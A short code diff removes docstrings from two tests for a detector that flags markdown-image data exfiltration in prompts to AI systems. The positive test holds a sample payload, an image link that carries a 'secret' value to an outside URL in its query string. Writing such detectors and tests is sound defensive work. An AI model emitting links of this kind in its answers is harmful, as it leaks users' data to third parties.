@@ -4,7 +4,6 @@ from src.prompt_guard.analysis.detectors.markdown_exfiltration import (
 
 
 def test_markdown_detector_positive_case():
-    """Tests that a prompt with a markdown image URL is detected."""
     detector = MarkdownImageExfiltrationDetector()
     prompt = "Here is some data ![img](http://example.com/log?data=secret)"
     vulnerabilities = list(detector.run(prompt))
@@ -16,7 +15,6 @@ def test_markdown_detector_positive_case():
 
 
 def test_markdown_detector_negative_case():
-    """Tests that a safe prompt is not flagged."""
     detector = MarkdownImageExfiltrationDetector()
     prompt = "This is a safe prompt with no images."
     vulnerabilities = list(detector.run(prompt))
